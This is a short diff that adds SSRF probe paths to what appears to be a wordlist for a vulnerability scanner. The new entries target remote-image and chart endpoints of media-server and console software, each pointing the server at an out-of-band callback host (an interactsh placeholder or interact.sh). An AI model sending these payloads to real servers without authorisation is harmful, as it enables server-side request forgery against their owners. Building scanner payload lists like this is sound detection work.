@@ -35,3 +35,8 @@
 /umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=http://{{interactsh-url}}/
 /wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css
 /wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}}/
+/Images/Remote?imageUrl=https://{{interactsh-url}}/
+/Items/RemoteSearch/Image?ImageUrl=https://{{interactsh-url}}/&ProviderName=TheMovieDB
+/Images/Remote?imageUrl=http://interact.sh/
+/Items/RemoteSearch/Image?ImageUrl=http://interact.sh/&ProviderName=TheMovieDB
+/console/chartServer?output=image&data=https://{{interactsh-url}}/
